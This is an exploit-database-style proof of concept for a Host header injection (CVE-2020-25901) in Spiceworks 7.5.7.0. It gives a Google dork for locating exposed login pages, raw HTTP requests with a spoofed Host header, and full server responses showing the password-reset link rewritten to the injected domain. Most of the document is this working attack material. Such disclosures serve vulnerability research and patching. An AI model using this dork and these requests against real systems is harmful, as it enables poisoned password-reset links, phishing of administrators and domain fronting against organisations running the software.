@@ -1,0 +1,352 @@
+# Exploit Title: Spiceworks 7.5 - HTTP Header Injection
+# Google Dork: inurl:/pro_users/login
+# Discovered Date: 15/09/2020
+# Exploit Author: Ramikan
+# Vendor Homepage: https://www.spiceworks.com
+# Affected Version: 7.5.7.0 may be others.
+# Tested On Version: 7.5.7.0 
+# CVE : CVE-2020-25901
+
+Vulnerability: Host Header Injection
+
+
+Description:
+Host Header Injection vulnerability may allow an attacker to spoof a particular Host header, allowing the attacker to render arbitrary links that point to a malicious website with poisoned Host header webpages.
+
+An issue was discovered in Spiceworks version 7.5.7.0 (may be affected on other versions too). The values of the 'Host' headers are implicitly set as trusted while this should be forbidden, leading to potential host header injection attack and also the affected hosts can be used for domain fronting. This means affected hosts can be used by attackers to hide behind during various other attack.
+
+
+Request:
+
+GET / HTTP/1.1
+Host: google.com
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+DNT: 1
+Connection: close
+Cookie: spiceworks_session=BAh7CjoPc2Vzc2lvbl9pZEkiJTU4NDg1MzhlMTAzNGEyMGNlZTRiYzI4YmZlNGVlNDljBjoGRUY6DnJldHVybl90byIGLzoQX2NzcmZfdG9rZW5JIjFyK3NZd3F4ZHpPSkFWNlhTb1ZhWVE0SE9iZzV1VGZIRmp0dURnM1ptSDlrPQY7BkZJIgpmbGFzaAY7BlRJQzonQWN0aW9uQ29udHJvbGxlcjo6Rmxhc2g6OkZsYXNoSGFzaHsABjoKQHVzZWR7ADoedXNlcl9pbnZpdGF0aW9uLnJldHVybl90byISL3dpemFyZC9zdGFydA%3D%3D--d7fabb212c9a1e683b384a24728f72fdaeffbc78; compatibility_test=testing; _gk=%7B%22t%22%3A%7B%7D%2C%22p%22%3A%7B%22cg_allow_st%22%3A%22%5B%5D%22%2C%22uuid%22%3A%22b7f707b6-f574-44bb-a766-986fc5851a03%22%7D%2C%22ab%22%3A%7B%7D%7D; opt_out=zdc; euconsent=BO3ulHHO3ulQVASABAENDWAAAAAyOAAA; _evidon_suppress_notification_cookie={"date":"\"2020-09-15T12:20:47Z\""}
+Upgrade-Insecure-Requests: 1
+
+Response:
+
+HTTP/1.1 302 Found
+Date: Tue, 15 Sep 2020 12:46:52 GMT
+Cache-Control: no-cache
+X-Runtime: 0
+Set-Cookie: spiceworks_session=BAh7CjoPc2Vzc2lvbl9pZEkiJTU4NDg1MzhlMTAzNGEyMGNlZTRiYzI4YmZlNGVlNDljBjoGRUY6DnJldHVybl90byIGLzoQX2NzcmZfdG9rZW5JIjFyK3NZd3F4ZHpPSkFWNlhTb1ZhWVE0SE9iZzV1VGZIRmp0dURnM1ptSDlrPQY7BkZJIgpmbGFzaAY7BlRJQzonQWN0aW9uQ29udHJvbGxlcjo6Rmxhc2g6OkZsYXNoSGFzaHsABjoKQHVzZWR7ADoedXNlcl9pbnZpdGF0aW9uLnJldHVybl90byISL3dpemFyZC9zdGFydA%3D%3D--d7fabb212c9a1e683b384a24728f72fdaeffbc78; path=/; HttpOnly
+Location: http://google.com/pro_users/login
+Content-Length: 99
+Connection: close
+Content-Type: text/html; charset=utf-8
+
+<html><body>You are being <a href="http://google.com/pro_users/login">redirected</a>.</body></html>
+
+Request:2
+
+GET /pro_users/login HTTP/1.1
+Host: google.com
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+DNT: 1
+Connection: close
+Cookie: spiceworks_session=BAh7CjoPc2Vzc2lvbl9pZEkiJTU4NDg1MzhlMTAzNGEyMGNlZTRiYzI4YmZlNGVlNDljBjoGRUY6DnJldHVybl90byIGLzoQX2NzcmZfdG9rZW5JIjFyK3NZd3F4ZHpPSkFWNlhTb1ZhWVE0SE9iZzV1VGZIRmp0dURnM1ptSDlrPQY7BkZJIgpmbGFzaAY7BlRJQzonQWN0aW9uQ29udHJvbGxlcjo6Rmxhc2g6OkZsYXNoSGFzaHsABjoKQHVzZWR7ADoedXNlcl9pbnZpdGF0aW9uLnJldHVybl90byISL3dpemFyZC9zdGFydA%3D%3D--d7fabb212c9a1e683b384a24728f72fdaeffbc78; compatibility_test=testing; _gk=%7B%22t%22%3A%7B%7D%2C%22p%22%3A%7B%22cg_allow_st%22%3A%22%5B%5D%22%2C%22uuid%22%3A%22b7f707b6-f574-44bb-a766-986fc5851a03%22%7D%2C%22ab%22%3A%7B%7D%7D; opt_out=zdc; euconsent=BO3ulHHO3ulQVASABAENDWAAAAAyOAAA; _evidon_suppress_notification_cookie={"date":"\"2020-09-15T12:20:47Z\""}
+Upgrade-Insecure-Requests: 1
+
+Response:2 (Forgot your password)Link replaced with domain in the header.
+
+HTTP/1.1 200 OK
+Date: Tue, 15 Sep 2020 12:48:26 GMT
+Cache-Control: private, max-age=0, must-revalidate
+X-UA-Compatible: IE=edge,chrome=1
+X-Runtime: 0
+ETag: "77c8f98180ec3f6d4f2fcc8dcd796462"
+Set-Cookie: compatibility_test=testing; path=/
+Set-Cookie: spiceworks_session=BAh7CjoPc2Vzc2lvbl9pZEkiJTU4NDg1MzhlMTAzNGEyMGNlZTRiYzI4YmZlNGVlNDljBjoGRUY6DnJldHVybl90byIGLzoQX2NzcmZfdG9rZW5JIjFyK3NZd3F4ZHpPSkFWNlhTb1ZhWVE0SE9iZzV1VGZIRmp0dURnM1ptSDlrPQY7BkZJIgpmbGFzaAY7BlRJQzonQWN0aW9uQ29udHJvbGxlcjo6Rmxhc2g6OkZsYXNoSGFzaHsABjoKQHVzZWR7ADoedXNlcl9pbnZpdGF0aW9uLnJldHVybl90byISL3dpemFyZC9zdGFydA%3D%3D--d7fabb212c9a1e683b384a24728f72fdaeffbc78; path=/; HttpOnly
+Content-Length: 9875
+Connection: close
+Content-Type: text/html; charset=utf-8
+
+<!DOCTYPE html>
+<html lang="en" class="no-js desktop">
+  <head>
+    <meta charset="utf-8" />
+    <title>Spiceworks</title>
+    <meta http-equiv="X-UA-Compatible" content="IE=Edge,chrome=1">
+    
+    <meta name="author" content="Spiceworks, Inc." />
+    <meta name="description" content="Network management made simple" />
+    <meta name="version" content="unknown" />
+
+    
+      
+      <noscript>
+        <meta http-equiv="refresh" content="2;url=/sessions/incompatible" />
+      </noscript>
+    
+
+    
+    
+<link href="/assets/sui.css?7500070" media="all" rel="stylesheet" type="text/css" />
+
+<link href="/assets/base.css?7500070" media="all" rel="stylesheet" type="text/css" />
+<link href="/assets/application.css?7500070" media="all" rel="stylesheet" type="text/css" />
+
+
+<!--[if IE]><link href="/stylesheets/hacks.ie.css?7500070" media="all" rel="stylesheet" type="text/css" /><![endif]-->
+<!--[if IE 7]><link href="/stylesheets/hacks.ie7.css?7500070" media="screen" rel="stylesheet" type="text/css" /><![endif]-->
+<!--[if IE 8]><link href="/stylesheets/hacks.ie8.css?7500070" media="screen" rel="stylesheet" type="text/css" /><![endif]-->
+<link href="/stylesheets/print.css?7500070" media="print" rel="stylesheet" type="text/css" />
+<link href="/assets/sui-print.css?7500070" media="print" rel="stylesheet" type="text/css" />
+
+
+
+<link href="/assets/wizard.css?7500070" media="screen" rel="stylesheet" type="text/css" />
+
+
+    <script src="/assets/sui_bundle.js?7500070" type="text/javascript"></script>
+
+
+<script type="text/javascript">
+//<![CDATA[
+
+  var _gaq = _gaq || [];
+  _gaq.push(['_setAccount', 'UA-314222-21']);
+  _gaq.push(['_setDomainName', 'none']);
+  _gaq.push(['_setAllowLinker', true]);
+  
+    _gaq.push(['_trackPageview']);
+  
+
+  
+    
+      
+      _gaq.push(['_setCustomVar', 1, '_v', '7.5.00070', 3]);
+      
+      
+        _gaq.push(['_setCustomVar', 2, '_d', 'xl', 3]);
+        _gaq.push(['_setCustomVar', 3, '_u', '2', 3]);
+      
+      _gaq.push(['_setCustomVar', 4, '_ul', 'anonymous', 2]);
+      _gaq.push(['_setCustomVar', 5, '_m', 'anonymous', 2]);
+    
+  
+
+  
+  
+  (function() {
+    var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
+    ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
+    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
+  })();
+
+//]]>
+</script>
+
+
+
+
+<script type="text/javascript">
+//<![CDATA[
+
+SPICEWORKS.ready(function(){ SPICEWORKS.fire('app:ready'); });
+document.observe('dom:loaded', function(){ SPICEWORKS.fire('ready'); });
+//]]>
+</script>
+
+
+  <script type="text/javascript">
+//<![CDATA[
+
+    (function($){
+      $(document).ready(function(){
+        $('#flash-notice-message').delay(9000).slideUp(300);
+      });
+    })(jQuery);
+  
+//]]>
+</script>
+
+
+    <script type="text/javascript">
+//<![CDATA[
+
+  var gekko = gekko || {};
+  gekko.cmd = gekko.cmd || [];
+  gekko.times = gekko.times || [];
+  gekko.times.push({ gekkoRequest: new Date().getTime() });
+  gekko.client = gekko.client || {};
+  gekko.client.app = {
+    'id': 'SWD',
+    'env': 'p',
+    'version': '7.5.00070'
+  };
+  gekko.client.user = {};
+  
+    gekko.client.user.uuid = 'b7f707b6-f574-44bb-a766-986fc5851a03';
+  
+  
+
+//]]>
+</script>
+<script async="false" src="//gekko.spiceworks.com/gekko.js" type="text/javascript"></script>
+<script async="true" type='text/javascript' src='//www.googletagservices.com/tag/js/gpt.js'></script>
+<script type="text/javascript">
+//<![CDATA[
+
+  gekko.cmd.push({cmd: function() { gekko.setAnalytics('_v', '7.5.00070'); }, important: true});
+
+//]]>
+</script>
+
+
+    <script>
+      var SWUFR = SWUFR || {};
+      SWUFR.cmd = SWUFR.cmd || [];
+    </script>
+    <script async src="//gekko.spiceworks.com/swufr.js"></script>
+
+    
+  <script>
+    SWUFR.cmd.push(function() {
+      SWUFR.ufr.installed()
+    });
+  </script>
+
+
+  </head>
+
+  
+  <!--[if lt IE 7]>  <body class="left-registerlogin-desktop sui-opt-in ie ie6 lte9 lte8 lte7 desktop"> <![endif]-->
+  <!--[if IE 7]>     <body class="left-register login-desktop sui-opt-in ie ie7 lte9 lte8 lte7 desktop"> <![endif]-->
+  <!--[if IE 8]>     <body class="left-register login-desktop sui-opt-in ie ie8 lte9 lte8 desktop"> <![endif]-->
+  <!--[if IE 9]>     <body class="left-register login-desktop sui-opt-in ie ie9 lte9 desktop"> <![endif]-->
+  <!--[if !IE]><!--> <body class="left-register login-desktop sui-opt-in no-ie desktop"> <!--<![endif]-->
+
+    
+      <header class="site-navigation sui-opt-in">
+  <nav class="global-nav affix" data-navbar="global" data-search-autocomplete-min-length="">
+    <div class="nav-fluid-container">
+      <a href="/" class="global-nav_brand">Home</a>
+      <img src="//static.spiceworks.com/assets/masthead/print_logo.png" class='global-nav_print-logo' />
+      
+    </div>
+  </nav>
+  
+</header>
+
+
+
+    
+
+    <!--[if lte IE 9]> 
+<div class="modal hide has-footer-in-body" data-backdrop="true" data-isdraggable="false" data-keyboard="false" id="install_chrome_frame"><div class="modal-header"> <h3>I'm gonna have to go ahead and ask you to use a different browser.</h3></div><div class="modal-body">
+  <img id="lumberg" src="/images/other/yeeeaaah.png" style="float:left; width:200px; ">
+  <div class="sui-opt-in" id="chrome_frame_install" style="padding-left: 10px; overflow:hidden; min-height:150px">
+    <p style="padding-top:10px; font-size:13px">Yeaaaah…  what's happening? </p> 
+    <p>We went ahead and stopped supporting Internet Explorer 9 and older in the Spiceworks app (IE10+ is now required), so if you could just go ahead and upgrade IE, that would be great… </p>
+    
+    <p style="padding-top:10px; font-size:11px; color: #AAA;">(Doesn't take long to install, and makes Spiceworks so much faster!)</p>
+  </div>
+  <div class="sui-opt-in" id="chrome_frame_reload" style="padding-left: 10px; overflow:hidden;">
+    <h4 class="">
+      <strong>
+       Whoops, looks like you might have gotten stuck.
+      </strong>
+    </h4>
+
+  </div>
+  <div class="footer-actions blue-permission-granted">
+ 
+    <a class="sui-bttn ieUpgrade" href="#" id="ieUpgrade" onclick=" upgradeIE(); ; return false;">Upgrade Internet Explorer</a>
+  </div>
+</div></div>
+<script type="text/javascript">
+//<![CDATA[
+
+  jQuery(function(){
+    SPICEWORKS.stats.record("chrome_frame_prompt_shown", {category: 'unsupported_ie'});
+    jQuery('#install_chrome_frame').modal();
+  })
+
+  function upgradeIE(){
+    SPICEWORKS.stats.record("installed_newer_ie", {category: 'unsupported_ie'});
+    window.location.href = "http://windows.microsoft.com/en-US/internet-explorer/download-ie";
+  }
+
+//]]>
+</script> <![endif] -->
+
+    <div class="sui-fluid-container">
+      <div id="content">
+        <img alt="Startup-bg" id="bg" src="/images/wizard/startup-bg.png?7500070" />
+        <div id="container">
+          <div id="wrapper">
+            <div id="float-msg">
+              <h1>Spiceworks is ready to rock!</h1>
+              <p>Please enter your login credentials.</p>
+            </div>
+            
+
+<div class="main-outer-border"><div class="main-inner-border"><div class="main-header logo"><h1><img alt="Spiceworks" class="logo" src="/images/logos/large.png?7500070" /></h1><div class="shadow-line ">&nbsp</div>
+</div><div class="main">
+
+  
+<div id="flash-container-for-sessions-new">
+  
+</div>
+
+
+  
+<form accept-charset="UTF-8" action="/pro_users/login" class="form-horizontal login" id="login_form" method="post"><div style="margin:0;padding:0;display:inline"><input name="authenticity_token" type="hidden" value="r+sYwqxdzOJAV6XSoVaYQ4HObg5uTfHFjtuDg3ZmH9k=" /></div><div style="margin:0;padding:0;display:inline;"><input name="_pickaxe" type="hidden" value="⸕" /></div>
+
+  
+  <div class=" control-group"><label for="pro_user_email">Email</label><div class="controls"><input id="pro_user_email" label="Email" name="pro_user[email]" size="30" type="text" /><span class="help-inline"></span></div></div>
+  <div class=" control-group"><label for="pro_user_password">Password</label><div class="controls"><input id="pro_user_password" label="Password" name="pro_user[password]" size="30" type="password" /><span class="help-inline"></span></div></div>
+  <div class="control-group controls forgot_password">
+    <a href="http://google.com/wizard/password/new" class="forgot-password">Forgot your password?</a>
+  </div>
+
+  
+    <div class=" control-group"><div class="controls">
+      <label class='checkbox'>
+        <input name="pro_user[remember_me]" type="hidden" value="0" /><input id="pro_user_remember_me" name="pro_user[remember_me]" type="checkbox" value="1" />
+        Stay logged in
+      </label>
+    </div></div>
+  
+
+  <div class=" control-group"><div class="controls">
+    <button class="sui-bttn-primary sui-bttn " data-button-type="submit" data-primary="true" type="submit">Log in</button>
+  </div></div>
+
+</form>
+
+</div></div></div>
+
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div id="footer">
+      <hr/>
+      <span class="pull-left">
+        <p>Copyright &copy; 2006-16 Spiceworks, Inc.</p>
+      </span>
+      <span class="pull-right">
+        <p>
+          <a href="https://www.spiceworks.com/about/">About</a> &bull;
+          <a href="https://www.spiceworks.com/privacy/">Privacy</a> &bull;
+          <a href="https://www.spiceworks.com/terms/">Terms</a> &bull;
+          <a href="https://community.spiceworks.com/support?utm_campaign=app_help&utm_medium=app&utm_source=app_ui">Help</a>
+        </p>
+      </span>
+    </div>
+
+    <script src="/assets/wizard.js?7500070" type="text/javascript"></script>
+  </body>
+</html>
